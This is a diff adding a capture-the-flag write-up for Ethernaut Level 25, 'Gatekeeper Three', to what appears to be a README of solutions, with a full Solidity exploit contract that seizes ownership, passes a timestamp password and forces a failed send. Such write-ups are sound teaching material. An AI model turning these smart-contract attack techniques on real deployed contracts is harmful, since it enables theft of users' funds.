@@ -1762,3 +1762,71 @@ This will:
 
 ### Level Completed
 ![Level Complete Output](assets/goodsamaritan.png)
+
+
+# Ethernaut Level 25: Gatekeeper Three
+
+### Strategy Overview
+
+The challenge has 3 gates to bypass:
+
+1. **Gate One**: I had to call `enter()` from a contract where `msg.sender == owner`, but `tx.origin != owner`.
+2. **Gate Two**: I needed to pass a password check that was based on `block.timestamp` at the time the `SimpleTrick` contract was deployed.
+3. **Gate Three**: I had to ensure the contract had more than 0.001 ether AND that `.send(0.001 ether)` to the `owner` failed — which happens if the owner is a contract with no `receive()` or `fallback`.
+
+---
+
+#### Deployed an Exploit Contract in Remix
+
+#### Executed `Exploit()` With ETH
+
+In Remix:
+- After deployment, I selected the deployed exploit contract,
+- I called the `Exploit()` function and attached **a bit more than 0.001 ETH** (I used `0.0011` ether),
+- That single call did everything:
+  - Called `construct0r()` to become the `owner`,
+  - Called `createTrick()` to deploy `SimpleTrick`,
+  - Passed the password check using `block.timestamp`,
+  - Sent ETH to the GatekeeperThree contract to pass the balance check,
+  - Caused `.send()` to fail because my exploit contract had no `receive()` or `fallback`,
+  - Finally, it called `enter()` successfully.
+
+---
+
+### Exploit Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGateKeeperThree {
+    function enter() external;
+    function construct0r() external;
+    function getAllowance(uint256 _password) external;
+    function createTrick() external;
+}
+
+contract ExploitGateKeeperThree {
+    IGateKeeperThree gateKeeperThree;
+
+    constructor(address _addr) {
+        gateKeeperThree = IGateKeeperThree(_addr);
+    }
+
+    function Exploit() public payable {
+        gateKeeperThree.construct0r();                      // Become owner
+        gateKeeperThree.createTrick();                      // Deploy SimpleTrick
+        gateKeeperThree.getAllowance(block.timestamp);      // Flip allowEntrance
+        address(gateKeeperThree).call{value:1000000000000001}(""); // Fund GatekeeperThree
+        gateKeeperThree.enter();                            // Call enter
+    }
+}
+```
+
+Expolit contract does not have any `receive()` or `fallback()` function, so `.send()` to me (as the owner) failed — which is exactly what `gateThree` needed.
+
+---
+
+### Level Completed
+![Level Complete Output](assets/GateKeeperThree.png)
+
